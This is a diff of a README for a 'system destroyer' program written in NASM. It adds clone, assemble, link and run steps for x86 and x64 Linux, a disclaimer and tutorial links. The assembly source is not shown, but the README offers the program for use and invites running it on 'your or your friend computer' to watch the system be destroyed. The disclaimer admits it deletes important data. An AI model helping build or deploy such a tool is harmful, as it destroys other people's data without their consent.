@@ -26,15 +26,23 @@ This is simple system destroyer script written using Netwide Assembler (NASM).
 This is simple instructions how to build and run your code. It may depend on your OS or distro
 ### Prerequisites
 
-To build and use this project you need to install Netwide Assembler and binutils
+To build and use this project you need to install `nasm` and `binutils` packages
 
-- Debian
+- Debian/Ubuntu
   ```sh
   sudo apt install nasm binutils
   ```
 - Arch Linux
-   ```sh
+  ```sh
   sudo pacman -S nasm binutils
+  ```
+- Fedora
+  ```sh
+  sudo dnf install nasm binutils
+  ```
+- FreeBSD
+  ```sh
+  sudo pkg install nasm binutils
   ```
 ### Installation
 
@@ -45,20 +53,39 @@ Use this commands to build this project. Note that for different systems buildin
    git clone https://github.com/xNOTHlNGx/system-destroyer.git
    ```
 2. Build nasm file
-   ```sh
-   nasm -felf64 linux.asm
-   ```
-4. Link built file
-   ```sh
-   ld -o main linux.o
-   ```
+   - x64_86
+     ```sh
+     nasm -felf64 linux_x64.asm
+     ```
+   - i386 (x86)
+     ```sh
+     nasm -felf linux_x32.asm
+     ```
+3. Link built file
+   - x64_86
+     ```sh
+     ld -o main -m elf_x86_64 linux_x64.o
+     ```
+   - i386 (x86)
+     ```sh
+     ld -o main -m elf_i386 linux_x32.o
+     ```
 ## Usage
 
 Just run previously built executable or your or your friend computer and see how your system is getting destroyed :)
+
+**Disclaimer: This script can potentially damage your system and delete important data. The author is not responsible for your actions, the script is provided for educational purposes only. This script can potentially damage your system and delete important data. The author is not responsible for your actions, the script is provided for educational purposes only. Use only if you have a backup of your data and know what you are doing.**
 ```sh
 chmod +x main
 ./main
-  ```
+```
+
+## Useful links
+
+Here are sime links that can be useful if you are learning nasm 
+ - [NASM Tutorial](https://cs.lmu.edu/~ray/notes/nasmtutorial/)
+ - [Linux system calls table](https://syscall.sh/)
+
 ## License
 
 Distributed under the GNU License. See [GNU License](https://www.gnu.org/licenses/gpl-3.0.html#license-text) for more information.
